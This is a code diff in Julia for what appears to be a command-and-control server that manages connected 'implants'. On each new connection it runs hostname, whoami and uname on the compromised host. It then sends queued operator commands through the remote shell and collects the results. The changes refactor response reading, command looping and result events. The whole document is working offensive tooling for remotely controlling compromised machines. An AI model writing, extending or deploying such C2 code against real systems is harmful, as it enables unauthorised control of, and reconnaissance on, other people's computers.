@@ -17,7 +17,11 @@ end
 function sendCommand(conn, cmd::String)
     @debug " 📥 sending '$cmd'"
     write(conn, "$cmd\n")
-    response = readline(conn)
+    # response = readline(conn) # works only for single line responses
+    # this is considered bad practice, maybe find a better alternative 
+    # that can read all available bytes (also multiline responses)
+    bytes = readavailable(conn)
+    response = strip(join(map(Char, bytes)))
     @debug "Got '$response'"
     return response
 end
@@ -25,22 +29,18 @@ end
 function handleNewImplant(conn, bus :: MessageBus, listenerId::String,  c2::C2)
     session = Session()
     c2.sessions[session.id] = session
-    println("New implant connected $(session.id)")
 
     hostname = sendCommand(conn, "hostname")
     user = sendCommand(conn, "whoami")
     os = inferOS(sendCommand(conn, "uname"))
 
-    println(" .... session started")
     publish!(bus, SessionStarted(id=session.id, listenerId=listenerId, hostname=hostname, user=user, os=os))
-    println(" .... post publish\n\n")
     # active lifetime of the implant
-    while true
-        @warn "Waiting for commands on implant $(session.id)"
-        cmd = take!(session.commands)
-        println(" >>>> 🫡 Command: $cmd")
+    # TODO: handle external session disconnct
+        # maybe send cycling pings to session, if it's a simple shell?
+    for cmd in session.commands
+        # println(" >>>> 🫡 Command: $cmd")
         res = sendCommand(conn, cmd)
-        println("result of command '$cmd': $res")
         put!(session.results, (cmd, res))
     end
 
@@ -49,7 +49,7 @@ function handleNewImplant(conn, bus :: MessageBus, listenerId::String,  c2::C2)
     publish!(bus, SessionEnded(session.id))
 end
 
-function inferOS(os::String) :: AbstractString
+function inferOS(os::AbstractString) :: AbstractString
     os = lowercase(os)
     if contains(os, "darwin")
         return "macOS"
@@ -98,16 +98,16 @@ function onSessionEnded(ev::SessionEnded, c2::C2)
 end
 
 
-function executeActionOnTarget(ev::ExecuteActionOnTarget, bus:: MessageBus, c2::C2)
+function executeActionOnTarget(ev::ExecuteActionOnTarget,  c2::C2)
     session = get(c2.sessions, ev.target, nothing)
     if isnothing(session)
         @error "Could not find target with id $(ev.target)"
         return
     end
-    println("sending action via channel")
     put!(session.commands, ev.action)
-    result = take!(session.results)
-    println("Action result: $result")
+    executedAction, result = take!(session.results)
+    # println("Action '$executedAction' result: $result")
+    return ActionExecuted(session.id, ev, result)
 end
 
 
@@ -121,7 +121,7 @@ function startC2(bus:: MessageBus)
 
     register!(bus, StartListener, (ev) -> startListener(ev, bus, c2))
     register!(bus, StopListener, (ev) -> onStoptListener(ev, bus, c2))
-    register!(bus, ExecuteActionOnTarget, (ev) -> executeActionOnTarget(ev, bus, c2))
+    register!(bus, ExecuteActionOnTarget, (ev) -> executeActionOnTarget(ev, c2))
 
     register!(bus, SessionEnded, (ev) -> onSessionEnded(ev, c2))
 end 
